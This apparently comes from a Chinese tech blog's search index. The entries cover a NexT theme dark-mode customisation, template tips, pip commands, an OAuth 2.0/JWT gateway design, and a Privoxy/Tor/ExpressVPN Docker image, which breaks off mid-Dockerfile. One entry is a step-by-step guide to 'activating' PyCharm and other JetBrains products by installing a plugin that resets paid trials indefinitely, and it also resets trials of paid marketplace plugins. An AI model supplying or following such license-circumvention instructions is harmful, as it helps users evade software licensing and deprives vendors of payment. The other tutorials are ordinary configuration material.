theme.canvas_ribbon.alpha }}\" zIndex=\"{{ theme.canvas_ribbon.zIndex }}\" src=\"{{ theme.vendors.canvas_ribbon }}\"&gt;&lt;/script&gt;{%- endif %}{# Customize darkmode.js - Declaration #}{%- if theme.darkmode_js.enable %} &lt;script src=\"{{ theme.vendors.darkmode_js }}\"&gt;&lt;/script&gt;{%- endif %}{%- for name in js_vendors() %} &lt;script src=\"{{ url_for(theme.vendors[name]) }}\"&gt;&lt;/script&gt;{%- endfor %}{# Customize darkmode.js - Invokation #}{%- if theme.darkmode_js.enable %}&lt;script&gt;var options = { bottom: '64px', // default: '32px' right: 'unset', // default: '32px' left: '32px', // default: 'unset' time: '0.5s', // default: '0.3s' mixColor: '#fff', // default: '#fff' backgroundColor: '#fff', // default: '#fff' buttonColorDark: '#100f2c', // default: '#100f2c' buttonColorLight: '#fff', // default: '#fff' saveInCookies: true, // default: true, label: '🌓', // default: '' autoMatchOsTheme: true // default: true}const darkmode = new Darkmode(options);darkmode.showWidget();&lt;/script&gt;{%- endif %} 更改后的源文件就如上所示，其他内容可以根据实际情况自行更改。添加上面的代码后，暗黑模式的切换按钮默认显示在左下角，如果希望切换按钮显示在右下角，可以参考以下代码： 1234567891011121314151617181920{# Customize darkmode.js - Invokation #}{%- if theme.darkmode_js.enable %}&lt;script&gt;var options = { bottom: '64px', // default: '32px' right: '32px', // default: '32px' left: 'unset', // default: 'unset' time: '0.5s', // default: '0.3s' mixColor: '#fff', // default: '#fff' backgroundColor: '#fff', // default: '#fff' buttonColorDark: '#100f2c', // default: '#100f2c' buttonColorLight: '#fff', // default: '#fff' saveInCookies: true, // default: true, label: '🌓', // default: '' autoMatchOsTheme: false // default: true}const darkmode = new Darkmode(options);darkmode.showWidget();&lt;/script&gt;{%- endif %} 暗黑模式 CSS 样式自定义实现原理分析从 Next 8.0 开始，已经原生支持代码块 Dark 主题，直接在 Next 的 _config.xml 文件里配置即可（如下所示）： 123456789codeblock: # Code Highlight theme # All available themes: https://theme-next.js.org/highlight/ theme: light: atelier-forest-light dark: androidstudio prism: light: prism dark: prism-atom-dark 其中 Next 8.3 源文件 themes/next/source/css/_colors.styl 的内容如下所示： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465:root { --body-bg-color: $body-bg-color; --content-bg-color: $content-bg-color; --card-bg-color: $card-bg-color; --text-color: $text-color; --blockquote-color: $blockquote-color; --link-color: $link-color; --link-hover-color: $link-hover-color; --brand-color: $brand-color; --brand-hover-color: $brand-hover-color; --table-row-odd-bg-color: $table-row-odd-bg-color; --table-row-hover-bg-color: $table-row-hover-bg-color; --menu-item-bg-color: $menu-item-bg-color; --btn-default-bg: $btn-default-bg; --btn-default-color: $btn-default-color; --btn-default-border-color: $btn-default-border-color; --btn-default-hover-bg: $btn-default-hover-bg; --btn-default-hover-color: $btn-default-hover-color; --btn-default-hover-border-color: $btn-default-hover-border-color; --highlight-background: $highlight-background; --highlight-foreground: $highlight-foreground; --highlight-gutter-background: $highlight-gutter-background; --highlight-gutter-foreground: $highlight-gutter-foreground;}if (hexo-config('darkmode')) { @media (prefers-color-scheme: dark) { :root { --body-bg-color: $body-bg-color-dark; --content-bg-color: $content-bg-color-dark; --card-bg-color: $card-bg-color-dark; --text-color: $text-color-dark; --blockquote-color: $blockquote-color-dark; --link-color: $link-color-dark; --link-hover-color: $link-hover-color-dark; --brand-color: $brand-color-dark; --brand-hover-color: $brand-hover-color-dark; --table-row-odd-bg-color: $table-row-odd-bg-color-dark; --table-row-hover-bg-color: $table-row-hover-bg-color-dark; --menu-item-bg-color: $menu-item-bg-color-dark; --btn-default-bg: $btn-default-bg-dark; --btn-default-color: $btn-default-color-dark; --btn-default-border-color: $btn-default-border-color-dark; --btn-default-hover-bg: $btn-default-hover-bg-dark; --btn-default-hover-color: $btn-default-hover-color-dark; --btn-default-hover-border-color: $btn-default-hover-border-color-dark; --highlight-background: $highlight-background-dark; --highlight-foreground: $highlight-foreground-dark; --highlight-gutter-background: $highlight-gutter-background-dark; --highlight-gutter-foreground: $highlight-gutter-foreground-dark; } img { opacity: .75; &amp;:hover { opacity: .9; } } }} 暗黑模式激活后，Darkmode.js 默认会将 darkmode--activated CSS 类添加到 body 标签，可以利用它覆盖暗黑模式默认的 CSS 样式。换句话说，只要将上面的 themes/next/source/css/_colors.styl 里的 CSS 样式添加到 darkmode--activated CSS 类的下面，就可以实现暗黑模式的 CSS 样式自定义。 实现步骤介绍 第一步：创建 themes/next/source/css/_custom/darkmode.styl 源文件，并将以下内容写入到文件里，code 样式用于控制暗黑模式下的代码块颜色显示 12345678910111213141516171819202122232425262728293031323334353637383940.darkmode--activated{ --body-bg-color: $body-bg-color-dark; --content-bg-color: $content-bg-color-dark; --card-bg-color: $card-bg-color-dark; --text-color: $text-color-dark; --blockquote-color: $blockquote-color-dark; --link-color: $link-color-dark; --link-hover-color: $link-hover-color-dark; --brand-color: $brand-color-dark; --brand-hover-color: $brand-hover-color-dark; --table-row-odd-bg-color: $table-row-odd-bg-color-dark; --table-row-hover-bg-color: $table-row-hover-bg-color-dark; --menu-item-bg-color: $menu-item-bg-color-dark; --btn-default-bg: $btn-default-bg-dark; --btn-default-color: $btn-default-color-dark; --btn-default-border-color: $btn-default-border-color-dark; --btn-default-hover-bg: $btn-default-hover-bg-dark; --btn-default-hover-color: $btn-default-hover-color-dark; --btn-default-hover-border-color: $btn-default-hover-border-color-dark; --highlight-background: $highlight-background-dark; --highlight-foreground: $highlight-foreground-dark; --highlight-gutter-background: $highlight-gutter-background-dark; --highlight-gutter-foreground: $highlight-gutter-foreground-dark; img { opacity: .75; &amp;:hover { opacity: .9; } } code { color: #69dbdc; background: transparent; }} 若添加上述 CSS 样式后，暗黑模式的切换按钮点击无效，那么可以尝试追加以下样式来解决 123button.darkmode-toggle { z-index: 9999;} 第二步：在 themes/next/source/css/main.styl 文件里引入上面创建的 CSS 文件即可 1@import '_custom/darkmode.styl'; 第三步：在 themes/next/layout/_scripts/vendors.njk 里更改 Darkmode.js 的颜色配置（如下所示），其中主要设置 mixColor: 'transparent' 与 backgroundColor: 'transparent'，否则自定义的暗黑模式 CSS 样式无法达到预期的显示效果 12345678910111213141516171819202122232425{# Customize darkmode.js - Declaration #}{%- if theme.darkmode_js.enable %} &lt;script src=\"{{ theme.vendors.darkmode_js }}\"&gt;&lt;/script&gt;{%- endif %}{# Customize darkmode.js - Invokation #}{%- if theme.darkmode_js.enable %}&lt;script&gt;var options = { bottom: '64px', // default: '32px' right: 'unset', // default: '32px' left: '32px', // default: 'unset' time: '0.5s', // default: '0.3s' mixColor: 'transparent', // default: '#fff' backgroundColor: 'transparent', // default: '#fff' buttonColorDark: '#100f2c', // default: '#100f2c' buttonColorLight: '#fff', // default: '#fff' saveInCookies: true, // default: true, label: '🌓', // default: '' autoMatchOsTheme: true // default: true}const darkmode = new Darkmode(options);darkmode.showWidget();&lt;/script&gt;{%- endif %} 重新构建生成静态文件Hexo 重新构建生成静态文件后，点击页面上的按钮即可切换暗黑模式 123$ hexo clean$ hexo g -d 支持评论系统的暗黑模式Waline 评论系统 Waline 评论系统启用暗黑模式 最终演示效果 常见问题评论区留言反馈若暗黑模式无法生效，你可以在下方的评论区留言，或者创建 GitHub Issue。希望你在留言的时候，能提供 NexT 主题的版本 + 博客链接，这样方便博主跟踪并帮你解决问题。 Darkmode.js 详细配置 Darkmode Github Chrome 无法正常显示切换按钮的图标默认的切换按钮图标 label: '🌓' 是 Emoji 表情字符，部分浏览器（如 Chrome）可能会显示为一个方块。解决方法是访问 Chrome 网上应用商店，手动安装 Chromoji 浏览器插件，即可让 Chrome 正常显示 Emoji 表情字符。请确保可以科学上网，否则无法正常访问 Chrome 的网上应用商店。若此方法依旧无法解决该问题，请参考下方评论区中网友 busyops 给出的解决方案，或在评论区留言，笔者会及时回复你。",tags:"静态博客"},{title:"PyCharm 2021.1 最新专业版激活教程",url:"/posts/cfba1e15.html",text:'前言本文适用于 PyCharm 2021.1 最新专业版的激活，由于 PyCharm 更新到 2021.1 版本后，之前所有的激活方式好像都失效了，所以今天介绍下最新的激活方式。该激活方法适用于 Jetbrains 全家桶任何版本，即使是从官网下载的最新版本，亲测可成功激活。 资源下载 Python 官网下载 PyCharm 官网下载 Jetbrains 激活插件下载（本站） PyCharm 激活更改 Hosts 文件更改 hosts 文件，将 hosts 文件中有关 Jetbrains 的配置行全部删除掉，若没有则请忽略此步骤。Windows 系统的 hosts 文件路径为：C:\\Windows\\System32\\drivers\\etc\\hosts，Linux 和 Mac 系统的 hosts 文件路径为：/etc/hosts，一般情况下只需删除以下两行内容即可： 120.0.0.0 www.jetbrains.com0.0.0.0 account.jetbrains.com PyCharm 安装与试用下载安装 PyCharm，然后启动 PyCharm 并选择试⽤（Evaluate for free）模式进⼊软件（如下图）。假设软件之前激活过且已失效、正在试用、试用过且已过期，那么必须先删除 PyCharm 的所有配置文件，然后再重新启动软件，PyCharm 配置文件所在的目录如下： 1234567# Windows系统C:\\Documents and Settings\\Administrator\\.PyCharm2021.1\\configC:\\Documents and Settings\\Administrator\\.PyCharm2021.1\\system# Linux/Mac系统~/.config/JetBrains/PyCharm2021.1~/.local/share/JetBrains/PyCharm2021.1 PyCharm 创建或选择项目选择创建项目或者打开已存在的项目 选择好项目路径和 Python 解释器后，点击 create 按钮后，进入 Pycharm 的主界面 PyCharm 激活这里的激活方式就是通过激活插件，让 PyCharm 可以一直试用，本质是重置 PyCharm，最终达到无限次试用 30 天的效果。值得一提的是，此激活方法会彻底重置 PyCharm，任何配置信息都将丢失，和新安装的时候一样。 离线激活方式首先手动下载好 PyCharm 的激活插件，然后启动 PyCharm 后，菜单栏导航到 file -&gt; settings -&gt; Plugins，依次点击 齿轮 -&gt; Install Plugin from Disk...，找到激活插件所在目录，选中本地激活文件 ide-eval-resetter-2.1.13.zip，最后点击 OK 按钮即可 在线激活方式启动 PyCharm 后，菜单栏导航到 file -&gt; settings -&gt; Plugins，依次点击 齿轮 -&gt; Manage Plugin Repositories...，点击 + 添加仓库 URL https://plugins.zhile.io，然后点击 OK 按钮 点击 Plugins -&gt; Maketplace，搜索 IDE Eval Reset 插件，然后点击 Install 按钮进行安装，如果搜索不到对应的插件，请检查网络是否通畅 PyCharm 激活插件配置一般来说，在 IDE 窗口切出去或切回来时（窗口失去 / 得到焦点）会触发事件，检测是否长时间（2 5 天）内没有重置，然后发送通知让你选择重置。也可以手动唤出激活插件的主界面，打开 PyCharm 的主界面，菜单栏导航到 Help -&gt; Eval Reset，弹出如下提示框，其中包括 2 个按钮，1 个勾选项： Reload 按钮：用来刷新界面上的显示信息 Reset 按钮：点击会询问是否重置试用信息并重启 IDE。选择 Yes 则执行重置操作并重启 IDE 生效，选择 No 则什么也不做（此为手动重置方式） Auto reset before per restart 勾选项：如果勾选了，则自勾选后每次重启 / 退出 IDE 时会自动重置试用信息，无需做额外的事情（此为自动重置方式） 常见问题Pycharm 无限重启如果 Pycharm 无限重启，说明之前的激活插件（例如 BetterInterlliJ）没有卸载，请卸载干净再重新激活 PyCharm 激活失败如果之前在 hosts 中添加过 0.0.0.0 account.JetBrains.com 和 0.0.0.0 www.JetBrains.com，请删除掉对应的内容再重新激活 如何更新激活插件 IDE 会自行检测其自身和所安装插件的更新并给予提示，如果本插件有更新，你会收到提示看到更新日志，自行选择是否更新 菜单栏导航到 Check for Updates...，手动检测 IDE 和所安装插件的更新，如果本插件有更新，你会收到提示看到更新日志，自行选择是否更新 插件更新可能会需要重启 IDE 付费插件重置说明市场上付费插件的试用信息也会一并重置，MyBatisCodeHelperPro 插件有两个版本如下，功能完全相同，安装时须看清楚： MyBatisCodeHelperPro (Marketplace Edition)，可重置！ MyBatisCodeHelperPro，不可重置！ 对于某些付费插件（如: Iedis 2, MinBatis）来说，可能需要去除掉 javaagent 配置（如果有）后再重启 IDE： 如果 IDE 没有打开项目，在 Welcome 界面点击菜单： Configure -&gt; Edit Custom VM Options... -&gt; 移除 -javaagent: 开头的内容 如果 IDE 打开了项目，点击菜单：Help -&gt; Edit Custom VM Options... -&gt; 移除 -javaagent: 开头的内容 重置需要重启 IDE 才生效 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开发工具"},{title:"构建 Hexo Next 主题的源码",url:"/posts/63112f7b.html",text:'核心源文件布局模板文件 /themes/next/layout/_layout.njk /themes/next/layout/_macro/post.njk 更改 Next 主题的源码NJK 模版文件判断是否为首页1{%- if is_index %} ... {%- endif %} 1{%- if not is_index %} ... {%- endif %} 引入自定义的 NJK 模版文件默认以 /theme/next/layout 为根目录，不需要使用 ../ 符号来引用上级目录中的模版文件 1{{ partial(\'_partials/_custom/adsense/post-footer-ads.njk\') }} 下述这种引入方式只能引入当前目录下（包括子目录）的模版文件，无法使用 ../ 符号来引用上级目录中的模版文件 1{%- include \'_custom/adsense/post-footer-ads.njk\' -%} NJK 模版文件获取 Hexo 的配置信息获取 Hexo 的配置文件 _config.yml 的内容： 1{%- if config.excerpt_description %} ... {%- endif %} 或者 123456&lt;div style="text-align:center"&gt; &lt;ins class="ads" style="display:block" data-ad-client="{{ config.adsense.publisher_id }}" data-full-width-responsive="true"&gt;&lt;/ins&gt;&lt;/div&gt; NJK 模版文件获取 Next 的配置信息获取 Next 主题的配置文件 /theme/next/_config.yml 的内容： 1{%- if theme.excerpt_description %} ... {%- endif %} 或者 123456&lt;div style="text-align:center"&gt; &lt;ins class="ads" style="display:block" data-ad-client="{{ theme.adsense.publisher_id }}" data-full-width-responsive="true"&gt;&lt;/ins&gt;&lt;/div&gt; NJK 模版文件获取文章的 Meta 信息1{%- if post.description and theme.excerpt_description %} ... {%- endif %} 覆盖 Next 默认的 CSS 样式123.vpreview p { color: #444 !important;} 取消 Next 默认的 CSS 样式123.comments { overflow: unset;} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"静态博客"},{title:"Python 常用命令",url:"/posts/1e59ef45.html",text:'Pip 管理模块单个更新模块12345678# 列出所有已安装的模块# pip list# 列出所有过期的模块# pip list --outdated# 更新指定的模块# pip install --upgrade requests 批量更新模块12345# 安装更新工具# pip install pip-review# 批量更新模块# pip-review --local --interactive --auto 批量卸载模块12345# 列出所有已安装的模块# pip freeze &gt; py.txt# 卸载所有已安装的模块# pip uninstall -y -r py.txt var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"python"},{title:"Gateway + Security + OAuth 2.0 + JWT 实现统一的认证授权",url:"/posts/2cb9090c.html",text:'1、前言1.1、OAuth 2.0 介绍 OAuth 2.0 特性与介绍 1.2、OAuth 2.0 与 JWT 的关系 OAuth 2.0 是一种认证授权的协议规范 JWT 是基于 Token 的安全认证协议的实现 OAuth 2.0 的认证服务器签发的 Token 可以使用 JWT 来实现，JWT 轻量且安全。 1.3、基于 OAuth 2.0 认证授权的框架OAuth 的官网提供了很多开发框架，分为服务器端和客户端，其中服务端和客户端都支持的 Java 框架有四个：Apache Oltu、Spring Security OAuth、Restlet Framework、Keycloak。值得一提的是，Keycloak 为现代应用和分布式服务提供了一套完整的认证授权管理开源解决方案，是一个独立的认证授权服务器；主要是基于 OAuth 2.0 协议实现，同时提供了多种语言库，可以很快速地根据业务需求将 Keycloak 集成到企业项目中去使用。 2、Gateway + Security + OAuth 2.0 + Knife4j2.1、认证授权流程 用户携带账号密码通过网关服务请求认证服务 认证通过后，授权服务颁发身份令牌给客户端，并将身份令牌储存在 Redis/MySQL 中 用户携带身份令牌请求资源服务（微服务应用），必经网关服务 网关服务获取客户端带来的令牌和 Redis/MySQL 中的令牌进行比对校验 网关服务校验通过后，转发 HTTP 请求，资源服务（微服务应用）获取到身份令牌，进行身份校验和鉴权，通过后处理系统业务 资源服务（微服务应用）将响应数据返回给客户端 提示 Gateway 校验并解析外部传递过来的身份令牌后，可以获取到用户信息（身份 + 权限），并将用户信息写入到 HTTP Header 里，让后续的微服务可以方便地得到用户信息 2.2、应用架构设计12345├── common 基础模块├── eureka 注册中心模块├── gateway 网关模块，负责校验认证（Token）、请求转发、统一解析用户信息├── shop 业务模块，负责校验认证（Token） 、鉴权└── auth 认证模块，负责用户的Oauth2.0认证授权，基于MySQL存储 认证服务负责认证和授权，网关服务只负责校验认证（Token）、请求转发和统一解析用户信息，业务模块负责校验认证（Token）和鉴权。由于 gateway、shop 模块没有使用 MySQL 存储，暂时无法实现注销 Token 的功能；若两者都引入 MySQL 存储，感觉应用有点重（依赖 ORM 框架，而且可能出现多数据源的场景），或者需要使用 Redis 存储来替代 MySQL 存储。终上所述，如果不考虑提供注销 Token 的功能，该方案还是可以接受的。 2.3、下载案例代码 Gateway + Security + OAuth 2.0 + Knife4j 整合案例代码下载 3、Gateway + Security + OAuth 2.0 + JWT3.1、应用架构设计123├── micro-oauth2-api 受保护的API服务，用户被网关服务鉴权通过后可以访问该服务，不整合Spring Security + Oauth2.0├── micro-oauth2-auth Oauth2.0认证服务，负责对登录用户进行认证授权，整合Spring Security + Oauth2.0，基于Redis存储└── micro-oauth2-gateway 网关服务，负责校验认证（Token）、鉴权和请求转发等，整合Spring Security + Oauth2，基于Redis存储 认证服务负责认证和授权，网关负责校验认证（Token）和鉴权，其他 API 服务则只负责处理自己的业务逻辑。安全相关的逻辑只存在于认证服务和网关服务中，其他 API 服务只是单纯地提供服务而没有任何安全相关逻辑。这种应用架构要求所有 HTTP 请求都必须经过网关服务，同时任何 API 服务都不能暴露在外网，否则会存在极大的安全隐患。 3.2、下载案例代码 Gateway + Security + OAuth 2.0 + JWT 整合案例代码下载 4、延伸内容4.1、Knife4j 整合 OAuth 2.0 Knife4j 整合 OAuth 2.0 4.2、网关是否适合进行认证与鉴权 第一派系：网关不适合进行业务操作，所以做个简单的去 Redis 比较 Token 校验是正确思路，剩下的交给后续的服务做 优点：不用在网关服务引入多余的 Spring Security、ORM 框架 缺点：第二派系的优点 第二派系： 网关用来认证与鉴权，登录蹦不蹦已经不是问题了，毕竟网关宕机，代表系统瘫痪了 优点：权限方面的代码会很好写，控制 URL 即可 缺点：第一派系的优点 第三派系： 网关用来认证与鉴权，但鉴权所需的数据（用户、角色、权限）从 Caffeine + Redis 缓存中加载，而认证授权服务启动时，负责将 MySQL 中权限相关的数据提前加载到 Redis 优点：第一与第二派系的优点 缺点：严重依赖 Redis，一般需要部署维护 Redis 集群，如果 Redis 集群宕机，可能会造成网关鉴权功能不可用或者系统瘫痪 4.3、基于 HTTP Header 传递用户信息的缺点基于 Spring Cloud 的技术体系（RESTful 接口规范），Gateway 校验并解析外部传递过来的 Access Token 后，获取到用户信息（身份 + 权限），同时将用户信息写入到 HTTP Header 里，让后面的业务系统接收到 Gateway 转发过来的请求后，也能从 HTTP Header 里得到相应的用户信息。但这种方式对使用了 RPC 调用的场景不适用，因为在 RPC 调用里，无法从 HTTP Header 获取到任何数据，该问题的讨论可以关注这里。 5、参考博客 API 网关认证授权 OAuth 2.0 的 Java 各类配置与使用场景 FAQ Spring Cloud Gateway + Security + OAuth 2.0 搭建微服务统一认证授权 Spring Cloud Gateway + Security + OAuth 2.0 + JWT 实现微服务统一认证鉴权 Spring Cloud Gateway + Security + OAuth 2.0 + JWT 集成统一认证授权平台下实现注销使 JWT 失效方案 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务 oauth"},{title:"构建 Privoxy、Tor、ExpressVPN 的 Docker 镜像",url:"/posts/3fe8dbc5.html",text:'前言教程目标构建集成了 Privoxy、Tor、ExpressVPN、SpeedTest 服务的 Docker 镜像，支持使用 SpeedTest 测试 ExpressVPN 的连接速度。Docker 镜像构建成功后，可以利用 Privoxy 与 Tor 在 ExpressVPN 的基础上，实现普通代理与匿名代理服务。 项目地址 expressvpn-privoxy-tor 构建镜像Dockerfile 文件Dockerfile 文件的内容如下，核心内容是安装 Privoxy、Tor、ExpressVPN，并指定 Privoxy 与 Tor 的监听端口 123456789101112131415161718192021222324252627FROM debian:bullseye-slimLABEL maintainer="benjamin@polkaned.net"ENV ACTIVATION_CODE CodeENV LOCATION smartARG APP=expressvpn_3.25.0.13-1_amd64.debRUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends \\ wget curl apt-utils apt-transport-https dirmngr ca-certificates expect iproute2 procps libnm0 gnupg2 tor privoxy \\ &amp;&amp; rm -rf /var/lib/apt/lists/* \\ &amp;&amp; wget -q "https://www.expressvpn.works/clients/linux/${APP}" -O /tmp/${APP} \\ &amp;&amp; dpkg -i /tmp/${APP} \\ &amp;&amp; rm -rf /tmp/*.deb \\ &amp;&amp; apt-get purge -y --auto-remove wget \\ &amp;&amp; sed -i \\ -e \'s/#SocksPort 192.168.0.1:9100/SocksPort 0.0.0.0:9050/g\' \\ -e \'s/#ControlPort 9051/ControlPort 9052/g\' \\ /etc/tor/torrc \\ &amp;&amp; sed -i \\ -e \'s/listen-address\\s*127.0.0.1:8118/listen-address 0.0.0.0:8118/g\' \\ /etc/privoxy/configCOPY entrypoint.sh /tmp/entrypoint.shCOPY expressvpnActivate.sh /tmp/expressvpnActivate.shENTRYPOINT ["/bin/bash", "/tmp/entrypoint.sh"] Shell 脚本文件entrypoint.sh 文件的内容如下： 12345678910111213#!/usr/bin/bashservice tor startservice privoxy startcp /etc/resolv.conf /tmp/resolv.confsu -c \'umount /etc/resolv.conf\'cp /tmp/resolv.conf /etc/resolv.confsed -i \'s/DAEMON_ARGS=.*/DAEMON_ARGS=""/\' /etc/init.d/expressvpnservice expressvpn restart/usr/bin/expect /tmp/expressvpnActivate.shexpressvpn connect $SERVERexec "$@" expressvpnActivate.sh 文件的内容如下： 1234567#!/usr/bin/expectspawn expressvpn activateexpect "code:"send "$env(ACTIVATION_CODE)\\r"expect "information."send "n\\r"expect eof 构建 Docker 镜像由于这里需要从官网下载 ExpressVPN 的安装包，因此构建 Docker 镜像时，必须保证可以科学上网，否则无法正常构建镜像。温馨提示，若无法提供科学上网的条件，可参考这里的方案来解决。 1# docker build --pull --no-cache --rm --force-rm -f Dockerfile -t polkaned/privoxy-tor-expressvpn:latest . 运行容器Docker 运行容器 {% your-activation-code %}：ExpressVPN 的激活码，例如 ACTIVATION_CODE=ABCD1EBGH2IJAL3MNOP4QRS {% LOCATION/ALIAS/COUNTRY %}：ExpressVPN 的连接位置，例如 SERVER=jpyo，若为空值则默认使用 ExpressVPN 的智能位置 1234567891011121314docker run \\ --env=ACTIVATION_CODE={% your-activation-code %} \\ --env=SERVER={% LOCATION/ALIAS/COUNTRY %} \\ --cap-add=NET_ADMIN \\ --device=/dev/net/tun \\ --privileged \\ --detach=true \\ --tty=true \\ -p 9050:9050 \\ -p 9052:9052 \\ -p 8118:8118 \\ --name=expressvpn \\ polkaned/privoxy-tor-expressvpn \\ /bin/bash Docker-Compose 运行容器docker-compose.yml 文件的内容如下： 12345678910111213141516171819202122version: "3.5"services: expressvpn: container_name: expressvpn image: polkaned/privoxy-tor-expressvpn:latest privileged: true restart: always environment: - ACTIVATION_CODE={% your-activation-code %} - SERVER={% LOCATION/ALIAS/COUNTRY %} cap_add: - NET_ADMIN devices: - /dev/net/tun ports: - 9050:9050 - 9052:9052 - 8118:8118 tty: true stdin_open: true command: /bin/bash 若其他容器需要使用 ExpressVPN，那么可以参考以下配置内容： 1234567891011121314151617181920212223242526272829version: "3.5"services: expressvpn: container_name: expressvpn image: polkaned/privoxy-tor-expressvpn:latest privileged: true restart: always environment: - ACTIVATION_CODE={% your-activation-code %} - SERVER={% LOCATION/ALIAS/COUNTRY %} cap_add: - NET_ADMIN devices: - /dev/net/tun ports: - 9050:9050 - 9052:9052 - 8118:8118 tty: true stdin_open: true command: /bin/bash downloader: image: example/downloader container_name: downloader network_mode: service:expressvpn depends_on: - expressvpn 通过 Docker-Compose 创建并启动 Docker 容器 12345# 创建并启动容器# docker-compose up -d# 查看容器的日志信息# docker logs -f --tail 20 expressvpn 测试 Privoxy 与 Tor 代理是否可用12345# 测试Privoxy$ curl -I -x 127.0.0.1:8118 www.google.com# 测试Tor$ curl --socks5 127.0.0.1:9050 www.google.com 进阶配置Privoxy 代理 Tor（可选）若希望 Privoxy 代理 Tor，可以在 /etc/privoxy/config 配置文件的末尾添加以下内容： 1forward-socks5 / 0.0.0.0:9050 . 限制请求来源的 IP（可选）若希望限制访问 Privoxy 代理服务的 IP，即新增 IP 白名单，则可以在 /etc/privoxy/config 配置文件的末尾添加以下内容： 123456# 编辑配置文件，IP需要根据实际情况进行更改# vim /etc/privoxy/configpermit-access 14.215.177.38/26# 重启容器让配置变更生效# docker restart expressvpn 挂载本地配置文件（可选）1）启动 Docker 容器后，分别拷贝一份 Privoxy、Tor 的配置文件到宿主机的本地磁盘 1234567# 创建宿主机本地的配置文件目录# mkdir -p /usr/local/tor# mkdir -p /usr/local/privoxy# 拷贝容器里的配置文件到宿主机的本地磁盘# docker cp expressvpn:/etc/tor/torrc /usr/local/tor/torrc# docker cp expressvpn:/etc/privoxy/config /usr/local/privoxy/config 2）创建 Privoxy 的 user.action 配置文件，用于阻止 Privoxy 指向服务器本身的 IP 和域名，这里请替换为你自己真实服务器的 IP 和域名 12345# 创建文件$ touch /usr/local/privoxy/user.action# 写入以下内容到文件中$ vim /usr/local/privoxy/user.action 12{+block{block ip and domain which point to server itself}}127.0.0.1 3）创建 Privoxy 的 user.filter 配置文件，用于存放 Privoxy 的过滤规则，暂时不需要填写任何内容 1$ touch /usr/local/privoxy/user.filter 4）更改 docker-compose.yml 文件，添加数据卷的配置内容（如下所示） 123456789101112131415161718192021222324252627version: "3.5"services: expressvpn: container_name: expressvpn image: polkaned/privoxy-tor-expressvpn:latest privileged: true restart: always environment: - ACTIVATION_CODE={% your-activation-code %} - SERVER={% LOCATION/ALIAS/COUNTRY %} cap_add: - NET_ADMIN devices: - /dev/net/tun ports: - 9050:9050 - 9052:9052 - 8118:8118 volumes: - /usr/local/tor/torrc:/etc/privoxy/torrc - /usr/local/privoxy/config:/etc/privoxy/config - /usr/local/privoxy/user.action:/etc/privoxy/user.action - /usr/local/privoxy/user.filter:/etc/privoxy/user.filter tty: true stdin_open: true command: /bin/bash VPN 管理ExpressVPN 常用管理命令123456789101112131415161718192021# 优化ExpressVPN的配置# docker exec -it expressvpn expressvpn protocol lightway_udp# docker exec -it expressvpn expressvpn preferences set desktop_notifications false# 查看ExpressVP的配置信息# docker exec -it expressvpn expressvpn preferences# 查看ExpressVPN的连接状态# docker exec -it expressvpn expressvpn status# 查看ExpressVPN的可连接地区# docker exec -it expressvpn expressvpn list# 连接VPN（智能连接）# docker exec -it expressvpn expressvpn connect# 连接VPN，并指定连接的地区# docker exec -it expressvpn expressvpn connect jpyo# 断开VPN连接# docker exec -it expressvpn expressvpn disconnect VPN 测速ExpressVPN 使用 SpeedTest 测速若希望测试 ExpressVPN 的连接速度，则可以安装 SpeedTest 来实现，更改后完整的 Dockerfile 如下： 1234567891011121314151617181920212223242526272829FROM debian:bullseye-slimLABEL maintainer="benjamin@polkaned.net"ENV ACTIVATION_CODE CodeENV LOCATION smartARG APP=expressvpn_3.18.1.0-1_amd64.debRUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends \\ wget curl apt-utils apt-transport-https dirmngr ca-certificates expect iproute2 procps libnm0 gnupg2 tor privoxy \\ &amp;&amp; rm -rf /var/lib/apt/lists/* \\ &amp;&amp; wget -q "https://www.expressvpn.works/clients/linux/${APP}" -O 